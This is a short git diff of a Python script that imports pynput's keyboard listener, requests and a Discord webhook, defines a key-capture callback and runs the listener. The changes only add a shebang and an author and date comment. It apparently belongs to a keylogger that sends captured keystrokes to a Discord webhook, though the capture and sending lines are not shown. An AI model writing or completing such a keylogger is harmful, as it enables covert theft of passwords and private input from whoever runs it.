@@ -1,3 +1,5 @@
+#!/bin/python3
+
 from pynput.keyboard import Listener
 import re, requests
 from discord import Webhook, RequestsWebhookAdapter
@@ -21,3 +23,9 @@ def cap(key):
 
 with Listener(on_press=cap) as l:
     l.join()
+
+
+###################
+# author: d1sx    #
+# date: 27/8/2021 #
+###################
